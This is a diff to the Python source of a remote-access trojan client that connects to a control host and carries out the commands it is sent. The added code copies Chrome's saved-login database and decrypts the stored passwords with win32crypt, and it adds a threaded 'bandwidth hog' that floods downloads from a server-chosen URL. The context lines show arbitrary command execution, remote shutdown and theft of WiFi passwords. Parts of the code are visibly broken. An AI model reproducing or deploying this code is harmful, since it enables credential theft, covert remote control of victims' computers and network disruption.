@@ -1,11 +1,13 @@
 import os
 import shutil
 import socket
+from multiprocessing.dummy import Pool as ThreadPool
+from urllib.request import urlopen
 
 s = socket.socket()
 port = 8080
-#host = input(str("enter server addr: "))
-host ="BlueEyesPC" # TODO
+# host = input(str("enter server addr: "))
+host = "BlueEyesPC"  # TODO
 s.connect((host, port))
 
 print("connected* ")
@@ -58,13 +60,11 @@ while 1:
 
         s.send("Done".encode())
 
-
     elif command == "7":
         # Send ipconfig
-        string = os.system("ipconfig") 
+        string = os.system("ipconfig")
         # TODO fix https://stackoverflow.com/questions/89228/calling-an-external-command-from-python/40319875#40319875
         s.send("Results of ipconfig******".encode())
-
 
     elif command == "8":
         # Exec custom command
@@ -75,7 +75,6 @@ while 1:
         except:
             s.send("bad command".encode())
 
-
     elif command == "9":
         # Shutdown PC 
         # https://stackoverflow.com/a/40319875
@@ -83,15 +82,16 @@ while 1:
 
         # https://stackoverflow.com/a/50824776/5728614
         import sys
+
         if sys.platform == 'win32':
             import ctypes
+
             user32 = ctypes.WinDLL('user32')
             user32.ExitWindowsEx(0x00000008, 0x00000000)
 
         else:
             os.system('sudo shutdown now')
         # os.system('shutdown /p /f')# alt shutdown /s
-
 
     elif command == "10":
         # Get get wifi password list
@@ -113,25 +113,74 @@ while 1:
             string += "\n"
 
         s.send(str(string).encode())
-    else:
-        print("Command not recognised")
 
 
     elif command == "11":
         # Get Chrome passwords list
-        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
+        # Original project:  https://github.com/alik604/chrome-password-thief/blob/master/chromePasswordThieve.py
+        from shutil import copyfile
+        from sqlite3 import connect
+        import win32crypt
+
+        env = os.getenv("LOCALAPPDATA")
+        chrome_passwords = "Chrome passwords:\n"
+
+        path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
+        path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
+        path = path.strip()
+        path2 = path2.strip()
+
         try:
-            os.system(str(tar))
-            s.send("Done".encode())
-        except Exception:
+            copyfile(path, path2)
+        except:
             pass
+        conn = connect(path2)
+        cursor = conn.cursor()
+        cursor.execute(
+            'SELECT action_url, username_value, password_value FROM logins')
+
+        sites = []
+        for raw in cursor.fetchall():
+            # print(raw)
+            ## raw[0] = url
+            ## raw[1] = login
+            ## raw[2] = binary
+            try:
+                if raw[0] not in sites:
+                    # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
+
+                    chrome_passwords += '\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[
+                        1] + '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+
+                    sites.append(raw[0])
+            except:
+                continue
+        conn.close()
+        s.send("Done".encode())
+
     elif command == "12":
-        # Bandwidth Hog 
-        if isBandwidthHoging:
-            
-        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
+        # Bandwidth Hog
+        # Original project: https://github.com/alik604/bandwidth-hog/blob/master/bandwidth-hog.py
+        URL = s.recv().decode()
         try:
-            os.system(str(tar))
-            s.send("Done".encode())
-        except Exception:
-            pass
+            def doneloadInChucksButDoNotSave(URL=URL):
+                response = urlopen(URL)
+                CHUNK_SIZE = 16 * 1024
+                while True:
+                    chunk = response.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+
+
+            listOfURLsToDownload = [URL for i in range(1000)]
+            pool = ThreadPool(4)
+            for i in range(5):
+                results = pool.map(doneloadInChucksButDoNotSave, listOfURLsToDownload)
+                pool.close()
+                pool.join()
+                print('Itration done')
+        except Exception as e:
+            print("Error with Bandwidth Hog", e)
+        s.send("Done".encode())
+    else:
+        print("Command not recognised")
